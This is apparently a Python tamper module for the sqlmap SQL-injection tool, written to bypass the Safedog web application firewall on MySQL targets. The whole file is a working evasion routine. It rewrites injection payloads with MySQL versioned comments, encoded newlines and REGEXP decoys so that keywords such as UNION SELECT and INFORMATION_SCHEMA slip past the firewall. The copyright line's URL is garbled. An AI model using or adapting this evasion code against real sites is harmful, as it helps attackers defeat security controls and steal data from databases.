#!/usr/bin/env python
# -*- coding: utf-8 -*-



"""
Copyright (c) 2006-2019 sqlmap developers (http:%23 %26%23 %26sqlmap.org%23 %26)
See the file 'LICENSE' for copying permission
Author:pureqh.top
"""

import re
import os

from lib.core.data import kb
from lib.core.enums import PRIORITY
from lib.core.common import singleTimeWarnMessage
from lib.core.enums import DBMS
__priority__ = PRIORITY.LOW

def dependencies():
    singleTimeWarnMessage("Bypass safedog by pureqh'%s' only %s" % (os.path.basename(__file__).split(".")[0], DBMS.MYSQL))

def tamper(payload, **kwargs):

        payload=payload.replace(" ","  ",1)
        payload=payload.replace("ORDER BY","REGEXP \"[...%25%23]\"   /*!11444order %0a by*/")
        payload=payload.replace("union ALL SELECT","/*!11444union all%0a select*/")
        payload=payload.replace(" AND","/*!11444AND*/")
        payload=payload.replace("(SELECT (CASE","(/*!11444SELECT*/ %0a (CASE")
        payload=payload.replace("UNION SELECT","/*!11444union*/  /*REGEXP \"[...%25%23]\"*/  %0a select /*REGEXP \"[...%25%23]\"*/")
        payload=payload.replace("UNION ALL SELECT","REGEXP \"[...%0a%23]\" /*!11444union %0a select */ ")
        payload=payload.replace("()","(%0a /*!80000aaa*/)")
        payload=payload.replace(" AS","/*!11444AS*/")
        payload=payload.replace("FROM","/*!11444FROM*/")
        payload=payload.replace("INFORMATION_SCHEMA","/*like\"%0a%23\"*/ %0a  INFORMATION_SCHEMA")
        payload=payload.replace("INFORMATION_SCHEMA.TABLES","%0a /*!11444INFORMATION_SCHEMA.TABLES*/")
        
        return payload
